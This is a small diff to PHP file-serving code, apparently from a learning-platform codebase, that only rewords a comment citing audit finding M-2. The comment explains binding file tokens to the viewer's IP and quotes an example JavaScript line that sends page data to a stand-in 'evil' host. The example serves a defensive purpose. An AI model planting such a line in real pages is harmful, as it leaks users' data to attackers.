@@ -256,7 +256,7 @@ if (!$mainfile) {
         // img/media/frame over https:, i.e. it CAN be exfiltrated to a third-party host (e.g.
         // new Image().src='https://evil/?'+location.pathname). Bind the key to the viewer's IP
         // so an exfiltrated token is useless when replayed from the attacker's server (the
-        // legitimate file fetches come from the same browser, hence the same IP). (audit M-2)
+        // legitimate file fetches come from the same browser, hence the same IP). Audit M-2.
         $filetoken = get_user_key(
             'core_files',
             $USER->id,
